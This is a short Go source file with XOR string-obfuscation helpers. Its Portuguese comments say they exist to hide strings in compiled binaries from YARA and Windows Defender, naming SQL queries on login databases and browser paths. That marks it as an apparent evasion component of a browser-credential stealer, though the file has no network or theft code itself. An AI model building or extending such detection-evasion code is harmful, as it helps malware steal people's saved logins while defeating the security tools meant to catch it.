package crypto

// DeobfuscateXOR decodifica em tempo de execução um array de bytes cifrado com uma chave XOR.
// Essa técnica remove assinaturas estáticas (Strings) do binário ELF/PE compilado,
// impedindo que mecanismos de varredura heurística como YARA ou o Windows Defender
// detectem queries forenses conhecidas (ex: queries SQL em logins, caminhos de navegadores).
func DeobfuscateXOR(obfuscated []byte, key byte) string {
	plain := make([]byte, len(obfuscated))
	for i := 0; i < len(obfuscated); i++ {
		plain[i] = obfuscated[i] ^ key
	}
	return string(plain)
}

// ObfuscateXOR gera a representação cifrada de uma string (utilitário para desenvolvedor)
func ObfuscateXOR(plain string, key byte) []byte {
	ciphered := make([]byte, len(plain))
	for i := 0; i < len(plain); i++ {
		ciphered[i] = plain[i] ^ key
	}
	return ciphered
}
